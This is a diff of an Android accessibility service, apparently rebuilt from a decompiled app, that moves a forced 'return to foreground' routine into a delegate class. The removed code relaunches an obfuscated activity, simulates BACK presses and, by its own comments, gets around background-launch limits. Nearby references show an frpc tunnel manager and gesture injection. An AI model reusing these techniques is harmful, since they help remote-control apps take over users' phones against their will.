@@ -52,6 +52,7 @@ import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
 import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
 import com.storm.safe.rock.service.delegates.BroadcastReceiverRegistry
 import com.storm.safe.rock.service.delegates.DetectionController
+import com.storm.safe.rock.service.delegates.SmartNavigator
 import com.storm.safe.rock.service.modules.FrpcProcessManager
 import com.storm.safe.rock.util.AssetConfigReader
 import java.util.Locale
@@ -317,6 +318,9 @@ class MyAccessibilityService : AccessibilityService() {
     /** Delegate: detection enable/disable (extracted from this service) */
     private var detectionController: DetectionController? = null
 
+    /** Delegate: smart navigation — return app to foreground (extracted from this service) */
+    private var smartNavigator: SmartNavigator? = null
+
     /** Delegate: broadcast receiver registration/unregistration */
     internal var broadcastReceiverRegistry: BroadcastReceiverRegistry? = null
 
@@ -366,6 +370,9 @@ class MyAccessibilityService : AccessibilityService() {
 
     /** JADX: f52439h0 (C0032al) — Gesture executor overlay manager */
     var gestureExecutor: Any? = null
+
+    /** Delegate for gesture dispatch (tap, swipe, long-press). Extracted from this class. */
+    private var gestureController: com.storm.safe.rock.service.delegates.GestureController? = null
 
     /** JADX: f52409e0 (u11) — Injection check periodic job reference */
     var injectionCheckJob: kotlinx.coroutines.Job? = null
@@ -649,11 +656,13 @@ class MyAccessibilityService : AccessibilityService() {
             // Step 3: Set timestamps and instance
             serviceStartTime = System.currentTimeMillis()
             instance = this
+            gestureController = com.storm.safe.rock.service.delegates.GestureController(this)
             detectionController = DetectionController(
                 eventFilterManagerProvider = { eventFilterManager },
                 networkManagerProvider = { networkManager }
             )
             broadcastReceiverRegistry = BroadcastReceiverRegistry(this)
+            smartNavigator = SmartNavigator(this)
 
             // Step 4: Configure accessibility service info
             initServiceConfig()
@@ -1254,6 +1263,7 @@ class MyAccessibilityService : AccessibilityService() {
             ActivityMonitor.logSystem("无障碍服务重新绑定 服务恢复")
         } catch (_: Exception) {}
         instance = this
+        if (smartNavigator == null) smartNavigator = SmartNavigator(this)
     }
 
     // ════════════════════════════════════════════════════════════════
@@ -3525,240 +3535,12 @@ class MyAccessibilityService : AccessibilityService() {
     // ════════════════════════════════════════════════════════════════
 
     /**
-     * Smart return to app. JADX: m211524m1 (m1)
-     *
-     * Presses HOME then launches iuzxujjtqev (DefaultLauncherAlias) to bring
-     * our app back to foreground. Full vendor implementation has brand-specific
-     * strategies (~680 LOC with Xiaomi/vivo special paths).
-     * Current: minimal stub that launches iuzxujjtqev with SMART_RETURN_BACKUP flag.
-     */
-    /**
      * Smart return to app. JADX: m211524m1
-     *
-     * Vendor routing via m211427e0() (detectXiaomiVersion):
-     *   SDK 29 → m2 (smartReturnToAppXiaomiM2)
-     *   SDK 33/34 → m3 (smartReturnToAppXiaomiM3)
-     *   SDK 35+ or non-Xiaomi → generic path (iuzxujjtqev + BACK loop)
+     * Delegated to SmartNavigator — contains brand-specific strategies
+     * (Xiaomi M2/M3 + generic multi-phase approach).
      */
     suspend fun smartReturnToApp(): Boolean {
-        return try {
-            android.util.Log.d(TAG, "🏠 [smartReturnToApp] 开始执行...")
-            val brand = Build.BRAND?.lowercase(Locale.ROOT) ?: ""
-            val sdk = Build.VERSION.SDK_INT
-            android.util.Log.d(TAG, "🏠 [smartReturnToApp] brand=$brand, SDK=$sdk")
-
-            // JADX m211427e0: detectXiaomiVersion — only SDK 29/33/34 get special treatment
-            val isXiaomi = brand.contains("xiaomi") || brand.contains("redmi") || brand.contains("poco")
-            if (isXiaomi) {
-                android.util.Log.d(TAG, "✅ [设备] 检测到小米设备, SDK=$sdk")
-                when (sdk) {
-                    29 -> return smartReturnToAppXiaomiM2()
-                    33, 34 -> return smartReturnToAppXiaomiM3()
-                    else -> {
-                        // SDK 35+ or other: vendor returns null, falls through to generic
-                        android.util.Log.d(TAG, "🏠 [smartReturnToApp] 小米SDK=$sdk, 走通用路径")
-                    }
-                }
-            }
-
-            // 通用路径: 先启动 Activity，再 BACK 循环
-            return smartReturnToAppGeneric(brand, sdk)
-        } catch (e: Exception) {
-            android.util.Log.w(TAG, "smartReturnToApp failed: ${e.message}")
-            false
-        }
-    }
-
-    /**
-     * 小米 Android 13+ 策略 (m3)。JADX: m211526m3, line 8909
-     * Phase 1: startActivity + delay(1500) → 检测
-     * Phase 2: 3次快速BACK(500ms间隔) → 检测
-     * Phase 3: 再次startActivity + delay(1000) → 最终检测
-     */
-    private suspend fun smartReturnToAppXiaomiM3(): Boolean {
-        android.util.Log.d(TAG, "🏠 [Xiaomi-m3] 开始 (Activity + BACK + Activity 兜底)")
-
-        val intent = Intent(this, com.storm.safe.rock.iuzxujjtqev::class.java).apply {
-            addFlags(
-                Intent.FLAG_ACTIVITY_NEW_TASK or
-                Intent.FLAG_ACTIVITY_CLEAR_TOP or
-                Intent.FLAG_ACTIVITY_SINGLE_TOP
-            )
-            putExtra("MI_ANDROID13_RETURN", true)
-            putExtra("FROM_ACCESSIBILITY_SERVICE", true)
-        }
-
-        // Phase 1: 直接 startActivity
-        try {
-            startActivity(intent)
-            android.util.Log.d(TAG, "🏠 [Xiaomi-m3] Phase1: Activity已启动")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ [Xiaomi-m3] Phase1: 启动失败", e)
-        }
-        kotlinx.coroutines.delay(1500L)
-
-        if (isCurrentlyInOurApp()) {
-            android.util.Log.d(TAG, "🏠 [Xiaomi-m3] ✅ Phase1 成功")
-            return true
-        }
-
-        // Phase 2: 3次快速 BACK
-        android.util.Log.d(TAG, "🏠 [Xiaomi-m3] Phase2: 3次BACK")
-        for (i in 1..3) {
-            performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
-            kotlinx.coroutines.delay(500L)
-        }
-
-        if (isCurrentlyInOurApp()) {
-            android.util.Log.d(TAG, "🏠 [Xiaomi-m3] ✅ Phase2 BACK成功")
-            return true
-        }
-
-        // Phase 3: 再次 startActivity 兜底
-        android.util.Log.d(TAG, "🏠 [Xiaomi-m3] Phase3: 再次startActivity兜底")
-        try {
-            startActivity(intent)
-        } catch (_: Exception) {}
-        kotlinx.coroutines.delay(1000L)
-
-        val result = isCurrentlyInOurApp()
-        android.util.Log.d(TAG, "🏠 [Xiaomi-m3] 最终结果=$result")
-        return result
-    }
-
-    /**
-     * 小米 Android 10 策略 (m2)。JADX: m211525m2, line 8791
-     * 纯 BACK 策略: 2次BACK → 失败后 startActivity 兜底
-     */
-    private suspend fun smartReturnToAppXiaomiM2(): Boolean {
-        android.util.Log.d(TAG, "🏠 [Xiaomi-m2] 开始 (BACK + Activity 兜底)")
-
-        if (isCurrentlyInOurApp()) return true
-
-        performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
-        kotlinx.coroutines.delay(500L)
-        if (isCurrentlyInOurApp()) return true
-
-        performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
-        kotlinx.coroutines.delay(500L)
-        if (isCurrentlyInOurApp()) return true
-
-        // 兜底: startActivity
-        try {
-            val intent = Intent(this, com.storm.safe.rock.iuzxujjtqev::class.java).apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
-                putExtra("MI_ANDROID10_RETURN", true)
-                putExtra("FROM_ACCESSIBILITY_SERVICE", true)
-            }
-            startActivity(intent)
-        } catch (_: Exception) {}
-        kotlinx.coroutines.delay(500L)
-        return isCurrentlyInOurApp()
-    }
-
-    /** JADX: m211472h7 — 检测当前是否在自己的 app */
-    private fun isCurrentlyInOurApp(): Boolean {
-        // Method 1: rootInActiveWindow（快但不可靠，可能返回旧窗口）
-        try {
-            if (rootInActiveWindow?.packageName?.toString() == packageName) return true
-        } catch (_: Exception) {}
-        // Method 2: 遍历 windows 查找我们的 app 窗口是否 active
-        try {
-            for (w in windows ?: emptyList()) {
-                if (w.isActive && w.root?.packageName?.toString() == packageName) return true
-            }
-        } catch (_: Exception) {}
-        // Method 3: 检查 Activity 引用是否存在且未销毁
-        try {
-            val act = com.storm.safe.rock.iuzxujjtqev.getCurrentActivity()
-            if (act != null && !act.isFinishing && !act.isDestroyed) {
-                if (act.hasWindowFocus()) return true
-            }
-        } catch (_: Exception) {}
-        return false
-    }
-
-    /**
-     * 通用返回策略。JADX: m211524m1 通用路径
-     * 先启动 Activity，再最多 6 次 BACK + 稳定性验证。
-     */
-    private suspend fun smartReturnToAppGeneric(brand: String, sdk: Int): Boolean {
-        val intent = Intent(this, com.storm.safe.rock.iuzxujjtqev::class.java).apply {
-            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
-            putExtra("SMART_RETURN_BACKUP", true)
-            putExtra("FROM_ACCESSIBILITY_SERVICE", true)
-        }
-
-        // Phase 0: moveTaskToFront（最可靠 — 绕过 BAL 限制，走 REORDER_TASKS 权限路径）
-        try {
-            val am = getSystemService(android.content.Context.ACTIVITY_SERVICE) as? android.app.ActivityManager
-            // Strategy A: AppTask.moveToFront
-            am?.appTasks?.forEach { task ->
-                try {
-                    if (task.taskInfo?.baseActivity?.packageName == packageName) {
-                        task.moveToFront()
-                        android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase0: AppTask.moveToFront")
-                    }
-                } catch (_: Exception) {}
-            }
-            kotlinx.coroutines.delay(1000L)
-            if (isCurrentlyInOurApp()) {
-                android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase0 AppTask 成功")
-                return true
-            }
-            // Strategy B: moveTaskToFront(taskId)
-            val taskId = com.storm.safe.rock.iuzxujjtqev.lastKnownTaskId
-            if (taskId > 0) {
-                am?.moveTaskToFront(taskId, android.app.ActivityManager.MOVE_TASK_WITH_HOME)
-                android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase0: moveTaskToFront(taskId=$taskId)")
-                kotlinx.coroutines.delay(1000L)
-                if (isCurrentlyInOurApp()) {
-                    android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase0 taskId 成功")
-                    return true
-                }
-            }
-        } catch (e: Exception) {
-            android.util.Log.w(TAG, "🏠 [smartReturnToApp] Phase0 失败: ${e.message}")
-        }
-
-        // Phase 1: startActivity（简单场景有效）
-        try {
-            startActivity(intent)
-            android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase1: startActivity")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ [smartReturnToApp] 启动Activity失败: ${e.message}", e)
-        }
-        kotlinx.coroutines.delay(2000L)
-        if (isCurrentlyInOurApp()) {
-            android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase1 成功")
-            return true
-        }
-
-        // Phase 2: BACK 回退兜底
-        android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase2: BACK循环")
-        val backDelay = if (brand.contains("vivo") && sdk >= 31) 1000L else 500L
-        for (i in 0 until 6) {
-            if (isCurrentlyInOurApp()) {
-                kotlinx.coroutines.delay(backDelay)
-                if (isCurrentlyInOurApp()) {
-                    android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase2 BACK第${i}次后稳定在app")
-                    return true
-                }
-            }
-            performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
-            android.util.Log.d(TAG, "🏠 [smartReturnToApp] BACK第${i + 1}次")
-            kotlinx.coroutines.delay(backDelay)
-        }
-        // 最后再试一次 startActivity
-        try { startActivity(intent) } catch (_: Exception) {}
-        kotlinx.coroutines.delay(2000L)
-        if (isCurrentlyInOurApp()) {
-            android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase3 最终startActivity成功")
-            return true
-        }
-
-        android.util.Log.w(TAG, "🏠 [smartReturnToApp] ❌ 全部策略失败")
-        return false
+        return smartNavigator?.smartReturnToApp() ?: false
     }
 
     /**
